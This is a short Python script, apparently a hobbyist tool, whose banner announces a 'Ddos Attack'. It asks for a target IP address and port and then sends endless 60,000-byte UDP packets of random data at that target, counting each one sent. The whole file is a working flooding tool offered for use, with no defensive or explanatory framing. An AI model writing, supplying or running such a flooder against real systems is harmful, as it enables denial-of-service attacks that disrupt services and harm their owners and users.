import os
import random
import socket

os.system("sudo apt-get install figlet")
os.system("clear")
os.system("figlet Ddos Attack")
print(" ")
print("Author --> IG | TG : @REC9P")
print(" ")
print(" ")
target_ip = str(input("Enter the target Ip number -->   "))
print(" ")
try:
    target_port = int(input("Enter the target post number -->   "))
except ValueError:
    print("You've dialed incorrectly !!!")

bytes = random._urandom(60000)

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

packega = 0

while True:
    sock.sendto(bytes, (target_ip, target_port))
    packega = packega+1
    print("Number of packages sent -->  %s" %(packega))
